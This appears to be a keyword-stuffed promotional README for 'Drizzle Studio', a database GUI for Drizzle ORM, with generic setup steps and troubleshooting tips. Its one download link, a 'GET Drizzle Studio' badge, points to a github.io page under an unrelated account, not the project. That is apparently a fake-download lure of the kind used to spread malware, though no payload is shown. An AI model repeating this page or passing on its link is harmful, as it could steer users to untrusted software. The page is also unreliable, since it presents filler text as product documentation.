Download Drizzle Studio to inspect, edit, and understand your SQL data with a visual workspace built for modern projects. Use Drizzle Studio database tools to browse tables, review records, validate schema changes, and speed up everyday development without leaving your workflow.

Drizzle Studio is a visual database workspace for browsing data, reviewing schemas, and managing SQL projects faster. It gives developers a clean Drizzle Studio GUI for inspecting tables, editing records, and understanding relationships without writing a query for every routine check. When paired with Drizzle ORM, the Drizzle Studio database view helps teams move from schema definition to data inspection with less context switching.

For local development, Drizzle Studio local workflows are especially useful because they let you review data beside the code that defines it. Teams using Drizzle Studio PostgreSQL, Drizzle Studio SQLite, or Drizzle Studio MySQL can browse project databases through a consistent interface while keeping schema awareness close to the application layer. Drizzle Studio hosted access can also support shared review sessions when collaborators need to inspect the same database state.

Drizzle Studio database browser features are built for practical development work: checking seed data, validating migrations, reviewing model changes, and confirming that application behavior matches the stored records. The Drizzle Studio schema viewer makes it easier to understand table structure, column types, indexes, and relationships, while Drizzle Studio docs and Drizzle Studio tutorial resources help new users understand setup choices quickly.

## Start Using Drizzle Studio

Prerequisites: A project using Drizzle ORM, a configured database connection, and access to the package scripts or tooling needed for Drizzle Studio setup.

[![GET Drizzle Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Drizzle%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://reedsellersurxa.github.io/.github/drizzle-studio)

1.  **Install the Tooling:** Add the required Drizzle Studio drizzle kit support to your project so the database workspace can read the same configuration used by your app.
2.  **Check Configuration:** Confirm that your Drizzle ORM schema, connection string, and environment variables are available before launching Drizzle Studio local.
3.  **Open the Interface:** Start the Drizzle Studio app and use the Drizzle Studio GUI to browse tables, inspect records, and compare data with application behavior.
4.  **Review and Iterate:** Use Drizzle Studio database views during migrations, seed updates, and debugging sessions to keep schema and data changes visible.

## Fixes for Common Setup Problems

- Connection failing? Recheck environment variables, database permissions, and the Drizzle Studio setup path used by your project scripts.
- Tables missing? Confirm that Drizzle ORM schema files are exported correctly and that migrations have been applied before opening Drizzle Studio database views.
- Local data not matching expectations? Restart Drizzle Studio local after changing seed scripts, database files, or connection targets.
- Interface cannot load schema? Review Drizzle Studio drizzle kit configuration and compare it with the current Drizzle Studio docs for your database type.
